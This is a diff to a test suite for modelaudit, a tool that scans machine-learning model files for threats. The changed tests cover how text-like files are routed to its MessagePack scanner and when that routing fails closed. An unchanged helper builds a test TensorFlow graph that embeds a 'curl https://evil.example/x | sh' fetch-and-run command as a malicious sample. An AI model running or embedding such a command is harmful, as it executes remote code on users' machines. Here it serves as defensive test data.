@@ -24,6 +24,7 @@ from modelaudit import core as core_module
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.utils.file import detection as file_detection
 from modelaudit.utils.file.detection import (
+    _CONTENT_ROUTE_TEXT_OWNER_COMPLETE_BYTES,
     FLAX_MSGPACK_STRUCTURE_READ_BYTES,
     JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES,
     LLAMAFILE_ROUTE_SCAN_BYTES,
@@ -40,7 +41,6 @@ from tests.helpers import (
     prefix_mock_onnx_with_unknown_field,
     prefix_mock_onnx_with_unknown_group,
 )
-from tests.helpers.file_creators import valid_jpeg_bytes
 
 
 def _require_tf_protos() -> None:
@@ -60,6 +60,16 @@ def _build_malicious_tf_metagraph() -> bytes:
     node.op = "PyFunc"
     node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
     return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_printable_utf8_ambiguous_binary_route() -> bytes:
+    """Build printable UTF-8 bytes that still require binary fail-closed routing."""
+    return (b'""' + ("é" * 17).encode("utf-8")) * 4097
+
+
+def _build_line_broken_printable_utf8_ambiguous_binary_route() -> bytes:
+    """Build line-broken printable UTF-8 bytes requiring binary fail-closed routing."""
+    return (b'""' + ("é" * 17).encode("utf-8") + b"\n") * 4097
 
 
 def _build_malicious_tf_savedmodel() -> bytes:
@@ -529,6 +539,44 @@ class TestDirectoryFileFiltering:
         assert determine_exit_code(results) == 1
         assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
 
+    @pytest.mark.parametrize(("filename", "line"), [("notes.txt", "Ġtoken token\n"), ("settings.conf", "token=olá\n")])
+    def test_large_plain_text_document_suffix_within_complete_text_bound_is_skipped(
+        self,
+        tmp_path: Path,
+        filename: str,
+        line: str,
+    ) -> None:
+        document = tmp_path / filename
+        document.write_text("#version: 0.2\n" + (line * 220_000), encoding="utf-8")
+
+        assert (
+            2 * FLAX_MSGPACK_STRUCTURE_READ_BYTES < document.stat().st_size < _CONTENT_ROUTE_TEXT_OWNER_COMPLETE_BYTES
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 0
+        assert "flax_msgpack" not in results.scanner_names
+
+    def test_oversized_plain_text_document_suffix_fails_closed_in_directory_scan(self, tmp_path: Path) -> None:
+        document = tmp_path / "notes.txt"
+        document.write_bytes(b"a" * (_CONTENT_ROUTE_TEXT_OWNER_COMPLETE_BYTES + 1))
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+
+    def test_small_plain_text_document_remains_skipped_in_directory_scan(self, tmp_path: Path) -> None:
+        document = tmp_path / "notes.txt"
+        document.write_text("ordinary project documentation\n", encoding="utf-8")
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 0
+        assert "flax_msgpack" not in results.scanner_names
+
     def test_multilingual_readme_stays_on_text_route(self, tmp_path: Path) -> None:
         readme = tmp_path / "README.md"
         readme.write_text(
@@ -607,25 +655,6 @@ class TestDirectoryFileFiltering:
         assert determine_exit_code(results) == 2
         metadata = results.file_metadata[str(readme)].model_dump(mode="python")
         assert "flax_msgpack_routing_incomplete" in metadata["scan_outcome_reasons"]
-
-    def test_oversized_plain_text_document_suffix_fails_closed_in_directory_scan(self, tmp_path: Path) -> None:
-        document = tmp_path / "notes.txt"
-        document.write_bytes(b" " * (2 * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1) + 2))
-
-        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
-
-        assert results["files_scanned"] == 1
-        assert "flax_msgpack" in results.scanner_names
-        assert determine_exit_code(results) == 2
-
-    def test_small_plain_text_document_remains_skipped_in_directory_scan(self, tmp_path: Path) -> None:
-        document = tmp_path / "notes.txt"
-        document.write_text("ordinary project documentation\n", encoding="utf-8")
-
-        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
-
-        assert results["files_scanned"] == 0
-        assert "flax_msgpack" not in results.scanner_names
 
     def test_direct_vocabulary_text_stays_on_text_route(self, tmp_path: Path) -> None:
         vocab = tmp_path / "vocab.txt"
@@ -787,6 +816,57 @@ class TestDirectoryFileFiltering:
         assert determine_exit_code(results) == 2
         metadata = results.file_metadata[str(merges)].model_dump(mode="python")
         assert "flax_msgpack_routing_incomplete" in metadata["scan_outcome_reasons"]
+
+    def test_utf8_control_scalar_merges_still_fails_closed_as_flax_in_directory_scan(
+        self,
+        tmp_path: Path,
+    ) -> None:
+        merges = tmp_path / "merges.txt"
+        merges.write_bytes(b"A\xc2\x80" * ((FLAX_MSGPACK_STRUCTURE_READ_BYTES // 3) + 1))
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["flax_msgpack"]
+        assert determine_exit_code(results) == 2
+        metadata = results.file_metadata[str(merges)].model_dump(mode="python")
+        assert "flax_msgpack_routing_incomplete" in metadata["scan_outcome_reasons"]
+
+    @pytest.mark.parametrize("filename", ["ambiguous.txt", "settings.conf"])
+    @pytest.mark.parametrize(
+        "prefix",
+        [b":", b": a\n", b"a:\n"],
+        ids=["colon-inline", "colon-space-value", "key-colon"],
+    )
+    def test_structure_prefixed_text_suffix_messagepack_candidate_is_scanned_in_directory(
+        self,
+        tmp_path: Path,
+        filename: str,
+        prefix: bytes,
+    ) -> None:
+        candidate = tmp_path / filename
+        candidate.write_bytes(prefix + _build_printable_utf8_ambiguous_binary_route())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+        assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    def test_key_prefixed_line_broken_text_suffix_messagepack_candidate_is_scanned_in_directory(
+        self,
+        tmp_path: Path,
+    ) -> None:
+        candidate = tmp_path / "ambiguous.conf"
+        candidate.write_bytes(b"key:\n" + _build_line_broken_printable_utf8_ambiguous_binary_route())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+        assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
 
     def test_large_json_array_under_skipped_suffix_is_scanned_fail_closed(self, tmp_path: Path) -> None:
         json_array = tmp_path / "metadata.jpg"
@@ -1030,7 +1110,7 @@ class TestDirectoryFileFiltering:
     def test_real_images_remain_skipped(self, tmp_path: Path) -> None:
         """Content sniffing should not promote ordinary media files into the scan set."""
         image_path = tmp_path / "cover.jpg"
-        image_path.write_bytes(valid_jpeg_bytes())
+        image_path.write_bytes(b"\xff\xd8\xff\xe0" + b"jpeg")
 
         results = scan_model_directory_or_file(str(tmp_path))
 
